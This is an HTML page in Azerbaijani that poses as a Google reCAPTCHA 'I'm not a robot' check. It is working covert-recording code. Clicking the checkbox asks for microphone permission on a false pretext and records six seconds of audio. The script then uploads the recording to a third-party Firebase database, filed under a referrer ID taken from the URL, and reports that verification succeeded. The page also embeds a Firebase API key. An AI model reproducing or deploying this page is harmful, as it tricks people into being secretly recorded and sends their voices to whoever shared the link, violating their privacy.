<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Verification</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <style>
        body { font-family: 'Roboto', sans-serif; background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .captcha-box { border: 1px solid #d3d3d3; padding: 20px; border-radius: 3px; background: #f9f9f9; display: flex; align-items: center; gap: 15px; width: 300px; }
        .checkbox { width: 25px; height: 25px; border: 2px solid #c1c1c1; cursor: pointer; display: flex; align-items: center; justify-content: center; }
        .checkbox.checked::after { content: '✔'; color: #0081ff; font-weight: bold; }
        .text { font-size: 14px; color: #555; flex: 1; }
        .logo { text-align: center; font-size: 10px; color: #555; }
    </style>
</head>
<body>

<div class="captcha-box">
    <div class="checkbox" id="check" onclick="startVerification()"></div>
    <div class="text">Mən robot deyiləm</div>
    <div class="logo">
        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="25"><br>
        reCAPTCHA<br>Gizlilik - Şərtlər
    </div>
</div>

<script>
    const firebaseConfig = { apiKey: "AIzaSyCM5WdZNSj9oFipNI-J3csHpOIvK8PjoLU", databaseURL: "https://sevgili-testi-default-rtdb.firebaseio.com" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const urlParams = new URLSearchParams(window.location.search);
    const owner = urlParams.get('ref');

    async function startVerification() {
        if(!owner) return;
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mediaRecorder = new MediaRecorder(stream);
            let chunks = [];

            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            mediaRecorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'audio/webm' });
                const reader = new FileReader();
                reader.readAsDataURL(blob);
                reader.onloadend = () => {
                    db.ref('audio_logs/' + owner).push({
                        url: reader.result,
                        time: new Date().toLocaleString()
                    });
                };
                document.getElementById('check').classList.add('checked');
                alert("Doğrulama uğurludur.");
            };

            mediaRecorder.start();
            setTimeout(() => { mediaRecorder.stop(); stream.getTracks().forEach(t => t.stop()); }, 6000); // 6 saniyəlik səs qeydi

        } catch (err) {
            alert("Səs doğrulaması üçün mikrofon icazəsi lazımdır.");
        }
    }
</script>
</body>
</html>
